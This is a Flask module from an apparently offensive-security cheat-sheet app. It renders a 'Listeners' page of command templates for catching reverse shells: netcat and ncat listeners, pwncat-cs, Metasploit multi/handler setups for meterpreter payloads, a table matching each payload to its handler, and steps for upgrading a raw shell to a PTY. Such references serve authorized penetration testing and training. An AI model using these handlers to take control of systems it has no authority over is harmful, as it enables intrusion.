from flask import Blueprint, render_template

bp = Blueprint("listener", __name__)

CARDS = [
    {"title": "Netcat", "hint": "Simplest catch-all. $LPORT from your variables.", "blocks": [
        {"tpl": "nc -lvnp $LPORT"},
        {"tpl": "rlwrap nc -lvnp $LPORT", "lbl": "readline (arrow keys / history)"},
        {"tpl": "nc -lvnp $LPORT -k", "lbl": "keep listening after disconnect"},
        {"tpl": "ncat --ssl -lvnp $LPORT", "lbl": "TLS listener (matches ncat --ssl shell)"},
        {"tpl": "ncat -u -lvnp $LPORT", "lbl": "UDP listener"},
    ]},
    {"title": "pwncat-cs", "hint": "Auto-upgrades the shell, gives file transfer, persistence, tab-complete.", "blocks": [
        {"tpl": "pwncat-cs -lp $LPORT"},
        {"tpl": "pwncat-cs $RHOST $LPORT", "lbl": "bind / connect out"},
        {"tpl": "pip install pwncat-cs", "lbl": "install"},
    ]},
    {"title": "Metasploit multi/handler", "hint": "Required for staged (meterpreter) payloads.", "blocks": [
        {"tpl": "msfconsole -qx \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run -j\""},
        {"tpl": "msfconsole -qx \"use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run\""},
        {"tpl": "msfconsole -qx \"use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run\"", "lbl": "stageless / plain shell"},
    ]},
    {"title": "Payload → matching handler", "hint": "Staged payloads (/meterpreter/reverse_tcp) MUST use multi/handler. Stageless (shell_reverse_tcp) catch with nc.", "blocks": [
        {"tpl": "shell (bash/sh/nc/python) ............ nc -lvnp $LPORT", "plain": True},
        {"tpl": "windows/…/shell_reverse_tcp .......... nc -lvnp $LPORT  (or multi/handler)", "plain": True},
        {"tpl": "windows/…/meterpreter/reverse_tcp ... multi/handler (staged)", "plain": True},
        {"tpl": "linux/…/meterpreter/reverse_tcp ..... multi/handler (staged)", "plain": True},
        {"tpl": "…/reverse_https | reverse_http ...... multi/handler (set LPORT 443/80)", "plain": True},
        {"tpl": "powershell/ConPtyShell ............... stty raw -echo; (stty size; cat) | nc -lvnp $LPORT", "plain": True},
        {"tpl": "ncat --ssl shell ..................... ncat --ssl -lvnp $LPORT", "plain": True},
    ]},
    {"title": "Upgrade a dumb shell to a PTY", "hint": "After you catch a raw shell.", "blocks": [
        {"tpl": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "lbl": "1. spawn pty"},
        {"tpl": "export TERM=xterm", "lbl": "2. set term"},
        {"tpl": "Ctrl+Z", "plain": True, "lbl": "3. background"},
        {"tpl": "stty raw -echo; fg", "lbl": "4. fix local echo, foreground"},
        {"tpl": "stty rows 50 columns 200", "lbl": "5. match your terminal size"},
    ]},
]


@bp.route("/listener")
def index():
    return render_template("cheat.html", active="listener",
                           title="Listeners", tag="access",
                           intro="Catch the callback. Pick the handler that matches your payload type — staged meterpreter needs multi/handler, plain shells take nc.",
                           cards=CARDS)


MODULE = {"id": "listener", "title": "Listeners", "category": "Access",
          "order": 1, "blueprint": bp, "endpoint": "listener.index"}
